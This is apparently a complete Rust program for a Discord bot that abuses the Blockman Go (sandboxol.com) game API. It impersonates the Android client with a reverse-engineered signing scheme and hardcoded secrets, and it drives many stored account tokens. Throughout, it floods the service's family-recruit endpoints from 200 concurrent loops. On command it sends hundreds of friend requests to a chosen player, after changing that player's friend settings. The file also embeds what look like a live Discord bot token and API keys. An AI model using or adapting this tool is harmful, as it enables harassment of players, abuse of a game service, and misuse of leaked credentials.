use anyhow::Result;
use aes::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
use aes::Aes128;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use futures::future::join_all;
use rand::prelude::*;
use rand::rngs::StdRng;
use rand::SeedableRng;
use reqwest::header::{HeaderMap, CONTENT_TYPE, USER_AGENT, ACCEPT_ENCODING, CONNECTION, HOST};
use serde::Deserialize;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH, Duration};
use tokio::fs;
use tokio::sync::RwLock;
use tokio::time::sleep;
use twilight_gateway::{Intents, Shard, ShardId, EventTypeFlags, StreamExt};
use twilight_model::gateway::event::Event;
use uuid::Uuid;

const GUILD_ID: u64 = 1394703406064734378;
const CHANNEL_ID: u64 = 1470118920890487028;
const API_SECRET: &str = "9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s";
const API_KEY_X: &str = "6aDtpIdzQdgGwrpP6HzuPA";
const BOT_TOKEN: &str = "MTQ2MTM3MzYwNDUxNTI4NzIzNw.GJdm5s.Ike9lvZ0Rn5NKggQ8QnKO88Hs0-GSe6A16ZHVI";

const LANGUAGES: &[&str] = &[
    "zh_CN,哥哥,姐姐,弟弟,妹妹",
    "en_US,Older Brother,Older Sister,Younger Brother,Younger Sister",
    "de_DE,Älterer Bruder,Ältere Schwester,Jüngerer Bruder,Jüngere Schwester",
    "es_ES,Hermano mayor,Hermana mayor,Hermano menor,Hermana menor",
    "fr_FR,Grand frère,Sœur aînée,Cadet,Sœur cadette",
    "hi_IN,बड़ा भाई,बड़ी बहन,छोटा भाई,छोटी बहन",
    "in_ID,Kakak,Kakak perempuan,Adik laki-laki,Adik perempuan",
    "it_IT,Fratello maggiore,Sorella maggiore,Fratello minore,Sorella minore",
    "ja_JP,兄さん,お姉さん,弟,妹",
    "ko_KR,형,언니,남동생,여동생",
    "pl_PL,Starszy brat,Starsza siostra,Młodszy brat,Młodsza siostra",
    "pt_PT,Irmão mais velho,Irmã mais velha,Irmão mais novo,Irmã mais nova",
    "ru_RU,Старший брат,Старшая сестра,Младший брат,Младшая сестра",
    "th_TH,พี่ชาย,พี่่สาว,น้องชาย,น้องสาว",
    "tr_TR,Abi,Abla,Küçük kardeş,Küçük kız kardeş",
    "uk_UA,Older Brother,Older Sister,Younger Brother,Younger Sister",
    "vi_VN,Anh trai,Chị gái,Em trai,Em gái"
];

#[derive(Debug, Clone)]
struct Account {
    id: String,
    token: String,
    register_ts: String,
    device_register_ts: String,
    device_id: String,
}

impl Account {
    fn from_line(line: &str) -> Option<Self> {
        let parts: Vec<&str> = line.trim().split(',').collect();
        if parts.len() < 5 { return None; }
        Some(Self {
            id: parts[0].to_string(),
            token: parts[1].to_string(),
            register_ts: parts[2].to_string(),
            device_register_ts: parts[3].to_string(),
            device_id: parts[4].to_string(),
        })
    }
}

#[derive(Debug, Deserialize)]
struct DnsAnswer {
    data: String,
    #[serde(rename = "type")]
    record_type: u16,
}

#[derive(Debug, Deserialize)]
struct DnsResponse {
    #[serde(rename = "Answer")]
    answer: Option<Vec<DnsAnswer>>,
}

struct State {
    http: reqwest::Client,
    accounts: Vec<Account>,
    discord_http: twilight_http::Client,
    data_centers: RwLock<Vec<String>>,
}

fn enc_token(token: &str, nonce: &str) -> String {
    let combined = format!("{}{}", token, nonce);
    let key_hex = format!("{:x}", md5::compute(API_SECRET.as_bytes()));
    let key = &key_hex.as_bytes()[..16];

    let xored: Vec<u8> = combined.bytes().map(|b| b ^ 0x73).collect();

    let block_size = 16;
    let len = xored.len();
    let padding_len = block_size - (len % block_size);
    let padded_len = len + padding_len;
    
    let mut buffer = vec![0u8; padded_len];
    buffer[..len].copy_from_slice(&xored);
    for i in len..padded_len {
        buffer[i] = padding_len as u8;
    }

    let cipher = Aes128::new(GenericArray::from_slice(key));
    
    for chunk in buffer.chunks_mut(block_size) {
        let block = GenericArray::from_mut_slice(chunk);
        cipher.encrypt_block(block);
    }

    BASE64.encode(buffer)
}

fn generate_sign(path: &str, nonce: &str, time: &str, data: &str, device_id: &str) -> String {
    let raw = format!("{}{}{}{}{}{}", API_KEY_X, path, nonce, time, data, API_SECRET);
    let first_md5 = format!("{:x}", md5::compute(raw));
    let final_raw = format!("{}{}", first_md5, device_id);
    format!("{:x}", md5::compute(final_raw))
}

async fn send_friend_request(
    client: &reqwest::Client, 
    account: &Account, 
    target_id: &str, 
    is_settings: bool
) -> Result<bool> {
    let nonce = Uuid::new_v4().to_string();
    let now = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs().to_string();
    
    let (url_path, data) = if is_settings {
        ("/friend/api/v1/friends/settings", format!("{{\"addFriendMarker\":1,\"userId\":{}}}", target_id))
    } else {
        ("/friend/api/v1/friends", format!("{{\"channel\":1,\"friendId\":{},\"gameId\":\"\",\"msg\":\"Let's be friends!\",\"type\":1}}", target_id))
    };

    let x_sign = generate_sign(url_path, &nonce, &now, &data, &account.device_id);
    let host = if rand::random::<bool>() { "gw" } else { "gwbyte" };
    let url = format!("http://{}.sandboxol.com{}", host, url_path);

    let mut headers = HeaderMap::new();
    headers.insert("userId", account.id.parse()?);
    headers.insert("packageName", "blockymods".parse()?);
    headers.insert("packageNameFull", "com.sandboxol.blockymods".parse()?);
    headers.insert("androidVersion", "36".parse()?);
    headers.insert("OS", "android".parse()?);
    headers.insert("appType", "android".parse()?);
    headers.insert("appLanguage", "en".parse()?);
    headers.insert("appVersion", "5542".parse()?);
    headers.insert("appVersionName", "3.8.2".parse()?);
    headers.insert("channel", "sandbox".parse()?);
    headers.insert("uid_register_ts", account.register_ts.parse()?);
    headers.insert("device_register_ts", account.device_register_ts.parse()?);
    headers.insert("eventType", "app".parse()?);
    headers.insert("userDeviceId", account.device_id.parse()?);
    headers.insert("userLanguage", "en_US".parse()?);
    headers.insert("region", "RU".parse()?);
    headers.insert("clientType", "client".parse()?);
    headers.insert("env", "prd".parse()?);
    headers.insert("package_name_en", "com.sandboxol.blockymods".parse()?);
    headers.insert("md5", "5d0de77b0f4b93b44669f146e54b49d9".parse()?);
    headers.insert("X-ApiKey", API_KEY_X.parse()?);
    headers.insert("X-Nonce", nonce.parse()?);
    headers.insert("X-Time", now.parse()?);
    headers.insert("X-Sign", x_sign.parse()?);
    headers.insert("X-UrlPath", url_path.parse()?);
    headers.insert("Access-Token", enc_token(&account.token, &nonce).parse()?);
    headers.insert(CONTENT_TYPE, "application/json; charset=UTF-8".parse()?);
    headers.insert(CONNECTION, "Keep-Alive".parse()?);
    headers.insert(ACCEPT_ENCODING, "gzip".parse()?);
    headers.insert(USER_AGENT, "okhttp/4.12.0".parse()?);

    let res = client.post(url).headers(headers).body(data).send().await?;
    if res.status().is_success() {
        let text = res.text().await?;
        return Ok(text.contains("SUCCESS"));
    }
    Ok(false)
}

async fn cdn_updater(state: Arc<State>) {
    let client = &state.http;
    
    loop {
        match client.get("https://pastebin.com/raw/1ctMgfnW").send().await {
            Ok(resp) => {
                if let Ok(text) = resp.text().await {
                    let ips: Vec<&str> = text.split(',')
                        .map(|s| s.trim())
                        .filter(|s| !s.is_empty())
                        .collect();

                    if !ips.is_empty() {
                        let tasks: Vec<_> = ips.iter().map(|ip| {
                            let url = format!("https://dns.google/resolve?name=gwbyte.sandboxol.com&type=A&edns_client_subnet={}", ip);
                            let c = client.clone();
                            async move {
                                match c.get(&url).send().await {
                                    Ok(r) => r.json::<DnsResponse>().await.ok(),
                                    Err(_) => None,
                                }
                            }
                        }).collect();

                        let results = join_all(tasks).await;

                        let mut new_centers = Vec::new();
                        for res in results.into_iter().flatten() {
                            if let Some(answers) = res.answer {
                                for ans in answers {
                                    if ans.record_type == 1 && !ans.data.is_empty() {
                                        new_centers.push(ans.data);
                                    }
                                }
                            }
                        }

                        new_centers.sort();
                        new_centers.dedup();

                        if !new_centers.is_empty() {
                            println!("DATA_CENTERS updated: {} IPs found", new_centers.len());
                            let mut lock = state.data_centers.write().await;
                            *lock = new_centers;
                        }
                    }
                }
            },
            Err(e) => eprintln!("Error fetching pastebin: {}", e),
        }
        
        sleep(Duration::from_secs(60)).await;
    }
}

async fn family_spam_task(state: Arc<State>) {
    let mut rng = StdRng::from_rng(&mut rand::rng());
    
    let url_path = "/friend/api/v1/family/recruit";

    loop {
        let target_ip = {
            let lock = state.data_centers.read().await;
            if lock.is_empty() {
                drop(lock);
                sleep(Duration::from_millis(100)).await;
                continue;
            }
            lock.choose(&mut rng).cloned()
        };

        if let Some(ip) = target_ip {
            if let Some(account) = state.accounts.choose(&mut rng) {
                let lang_str = LANGUAGES.choose(&mut rng).unwrap();
                let parts: Vec<&str> = lang_str.split(',').collect();
                let lang_code_full = parts[0];
                let lang_code_short = &lang_code_full[0..2];

                let nonce = Uuid::new_v4().to_string();
                let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs().to_string();
                let sign = generate_sign(url_path, &nonce, &now, "", &account.device_id);
                let url = format!("http://{}:80{}", ip, url_path);

                let mut headers = HeaderMap::new();
                headers.insert("userId", account.id.parse().unwrap());
                headers.insert("packageName", "blockymods".parse().unwrap());
                headers.insert("packageNameFull", "com.sandboxol.blockymods".parse().unwrap());
                headers.insert("androidVersion", "36".parse().unwrap());
                headers.insert("OS", "android".parse().unwrap());
                headers.insert("appType", "android".parse().unwrap());
                headers.insert("appLanguage", lang_code_short.parse().unwrap());
                headers.insert("appVersion", "5542".parse().unwrap());
                headers.insert("appVersionName", "3.8.2".parse().unwrap());
                headers.insert("channel", "sandbox".parse().unwrap());
                headers.insert("uid_register_ts", account.register_ts.parse().unwrap());
                headers.insert("device_register_ts", account.device_register_ts.parse().unwrap());
                headers.insert("eventType", "app".parse().unwrap());
                headers.insert("userDeviceId", account.device_id.parse().unwrap());
                headers.insert("userLanguage", lang_code_full.parse().unwrap());
                headers.insert("region", "RU".parse().unwrap());
                headers.insert("clientType", "client".parse().unwrap());
                headers.insert("env", "prd".parse().unwrap());
                headers.insert("package_name_en", "com.sandboxol.blockymods".parse().unwrap());
                headers.insert("md5", "5d0de77b0f4b93b44669f146e54b49d9".parse().unwrap());
                headers.insert("X-ApiKey", API_KEY_X.parse().unwrap());
                headers.insert("X-Nonce", nonce.parse().unwrap());
                headers.insert("X-Time", now.parse().unwrap());
                headers.insert("X-Sign", sign.parse().unwrap());
                headers.insert("X-UrlPath", url_path.parse().unwrap());
                headers.insert("Access-Token", enc_token(&account.token, &nonce).parse().unwrap());
                headers.insert(HOST, "gwbyte.sandboxol.com".parse().unwrap());
                headers.insert(CONNECTION, "Keep-Alive".parse().unwrap());
                headers.insert(ACCEPT_ENCODING, "gzip".parse().unwrap());
                headers.insert(USER_AGENT, "okhttp/4.12.0".parse().unwrap());

                let _ = state.http.delete(&url).headers(headers).send().await;

                let nonce = Uuid::new_v4().to_string();
                let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs().to_string();

                let m_type = rng.random_range(1..=4);
                let o_type = rng.random_range(1..=4);
                
                let member_name = parts.get(m_type).unwrap_or(&"Brother");
                let owner_name = parts.get(o_type).unwrap_or(&"Sister");

                let data = format!(
                    "{{\"age\":0,\"memberName\":\"{}\",\"memberType\":{},\"msg\":\"\",\"ownerName\":\"{}\",\"ownerType\":{}}}",
                    member_name, m_type, owner_name, o_type
                );

                let sign = generate_sign(url_path, &nonce, &now, &data, &account.device_id);

                let mut headers = HeaderMap::new();
                headers.insert("language", lang_code_full.parse().unwrap());
                headers.insert("userId", account.id.parse().unwrap());
                headers.insert("packageName", "blockymods".parse().unwrap());
                headers.insert("packageNameFull", "com.sandboxol.blockymods".parse().unwrap());
                headers.insert("androidVersion", "36".parse().unwrap());
                headers.insert("OS", "android".parse().unwrap());
                headers.insert("appType", "android".parse().unwrap());
                headers.insert("appLanguage", lang_code_short.parse().unwrap());
                headers.insert("appVersion", "5542".parse().unwrap());
                headers.insert("appVersionName", "3.8.2".parse().unwrap());
                headers.insert("channel", "sandbox".parse().unwrap());
                headers.insert("uid_register_ts", account.register_ts.parse().unwrap());
                headers.insert("device_register_ts", account.device_register_ts.parse().unwrap());
                headers.insert("eventType", "app".parse().unwrap());
                headers.insert("userDeviceId", account.device_id.parse().unwrap());
                headers.insert("userLanguage", lang_code_full.parse().unwrap());
                headers.insert("region", "RU".parse().unwrap());
                headers.insert("clientType", "client".parse().unwrap());
                headers.insert("env", "prd".parse().unwrap());
                headers.insert("package_name_en", "com.sandboxol.blockymods".parse().unwrap());
                headers.insert("md5", "5d0de77b0f4b93b44669f146e54b49d9".parse().unwrap());
                headers.insert("X-ApiKey", API_KEY_X.parse().unwrap());
                headers.insert("X-Nonce", nonce.parse().unwrap());
                headers.insert("X-Time", now.parse().unwrap());
                headers.insert("X-Sign", sign.parse().unwrap());
                headers.insert("X-UrlPath", url_path.parse().unwrap());
                headers.insert("Access-Token", enc_token(&account.token, &nonce).parse().unwrap());
                headers.insert(CONTENT_TYPE, "application/json; charset=UTF-8".parse().unwrap());
                headers.insert(HOST, "gwbyte.sandboxol.com".parse().unwrap());
                headers.insert(CONNECTION, "Keep-Alive".parse().unwrap());
                headers.insert(ACCEPT_ENCODING, "gzip".parse().unwrap());
                headers.insert(USER_AGENT, "okhttp/4.12.0".parse().unwrap());

                let _ = state.http.post(&url).headers(headers).body(data).send().await;
            }
        }
        sleep(Duration::from_secs(1)).await;
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let content = fs::read_to_string("noban.txt").await.expect("Could not read noban.txt");
    let accounts: Vec<Account> = content.lines().filter_map(Account::from_line).collect();
    println!("Loaded {} accounts", accounts.len());

    let http_client = reqwest::Client::builder()
        .pool_max_idle_per_host(200)
        .tcp_keepalive(std::time::Duration::from_secs(60))
        .pool_idle_timeout(None)
        .tcp_nodelay(true)
        .build()?;

    let intents = Intents::GUILD_MESSAGES | Intents::MESSAGE_CONTENT;
    let mut shard = Shard::new(ShardId::ONE, BOT_TOKEN.to_string(), intents);
    let discord_http = twilight_http::Client::new(BOT_TOKEN.to_string());

    let state = Arc::new(State {
        http: http_client,
        accounts,
        discord_http,
        data_centers: RwLock::new(Vec::new()),
    });

    let cdn_state = state.clone();
    tokio::spawn(async move {
        cdn_updater(cdn_state).await;
    });

    println!("Waiting for Data Centers...");
    loop {
        let count = {
            let lock = state.data_centers.read().await;
            lock.len()
        };
        if count > 0 {
            break;
        }
        sleep(Duration::from_millis(500)).await;
    }
    println!("Data Centers found. Starting spam tasks.");

    for _ in 0..200 {
        let spam_state = state.clone();
        tokio::spawn(async move {
            family_spam_task(spam_state).await;
        });
    }

    println!("Bot is running...");

    loop {
        let event = match shard.next_event(EventTypeFlags::all()).await {
            Some(Ok(event)) => event,
            Some(Err(source)) => {
                eprintln!("Gateway error: {:?}", source);
                continue;
            }
            None => {
                println!("Shard closed");
                break;
            }
        };

        let state_clone = state.clone();
        tokio::spawn(async move {
            if let Err(e) = handle_discord_event(event, state_clone).await {
                eprintln!("Handler error: {:?}", e);
            }
        });
    }
    Ok(())
}

async fn handle_discord_event(event: Event, state: Arc<State>) -> Result<()> {
    if let Event::MessageCreate(msg) = event {
        if msg.author.bot || msg.guild_id.map(|id| id.get()) != Some(GUILD_ID) || msg.channel_id.get() != CHANNEL_ID {
            return Ok(());
        }

        if msg.content.starts_with(".f ") {
            let parts: Vec<&str> = msg.content.split_whitespace().collect();
            let target_id = match parts.get(1) {
                Some(id) if id.chars().all(char::is_numeric) => *id,
                _ => {
                    state.discord_http.delete_message(msg.channel_id, msg.id).await?;
                    return Ok(());
                }
            };

            let settings_account = {
                let mut rng = rand::rng();
                state.accounts.choose(&mut rng).cloned()
            };

            if let Some(acc) = settings_account {
                let _ = send_friend_request(&state.http, &acc, target_id, true).await;
            }

            let mut tasks = Vec::with_capacity(200);
            {
                let mut rng = rand::rng();
                for _ in 0..200 {
                    if let Some(acc) = state.accounts.choose(&mut rng) {
                        let client = state.http.clone();
                        let acc_clone = acc.clone();
                        let tid = target_id.to_string();
                        tasks.push(tokio::spawn(async move {
                            send_friend_request(&client, &acc_clone, &tid, false).await
                        }));
                    }
                }
            }

            let results = join_all(tasks).await;
            let success_count = results.into_iter()
                .filter_map(|r| r.ok())
                .filter_map(|r| r.ok())
                .filter(|&success| success)
                .count();

            let response = format!(
                "{} friend requests were sent to player {}\n\nAutomatically “Allow anyone to send friend requests”.", 
                success_count, target_id
            );

            state.discord_http.create_message(msg.channel_id)
                .content(&response)
                .reply(msg.id)
                .await?;
        }
    }
    Ok(())
}